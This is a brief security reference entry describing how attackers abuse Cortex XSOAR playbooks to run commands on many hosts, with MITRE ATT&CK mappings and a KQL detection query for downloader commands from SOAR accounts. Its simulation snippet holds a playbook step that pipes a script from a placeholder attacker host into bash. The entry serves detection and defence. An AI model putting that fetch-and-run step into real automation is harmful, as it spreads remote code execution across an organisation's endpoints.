---
title: Cortex XSOAR
tags:
  - Execution
  - Lateral Movement
  - Defense Evasion
references:
  - https://www.paloaltonetworks.com/cortex/xsoar
files: []
---

Cortex XSOAR is a SOAR platform used to orchestrate and automate incident response workflows across many tools and endpoints. If compromised, it becomes a powerful framework for attackers to execute commands across the environment.

# Abusing Playbooks for Remote Command Execution

## Description
Threat actors can modify or create XSOAR playbooks that execute scripts (for example via SSH, WinRM, or EDR integrations) and then trigger them to deploy malware or tooling to large numbers of hosts.

## Simulation
```yaml
- name: Malicious Playbook Step
  script: 'ssh-command'
  args:
    cmd: "curl http://attacker/payload.sh | bash"
```

## MITRE ATT&CK
T1059 – Command and Scripting Interpreter  
T1021 – Remote Services

## Detections
```kql
// Focused on endpoints receiving suspicious commands from management servers
DeviceProcessEvents
| where InitiatingProcessAccountName in ("xsoar","automation","soar-svc")
| where ProcessCommandLine has_any ("curl http://","Invoke-WebRequest","wget ")
| project Timestamp, DeviceName, InitiatingProcessAccountName, ProcessCommandLine
```
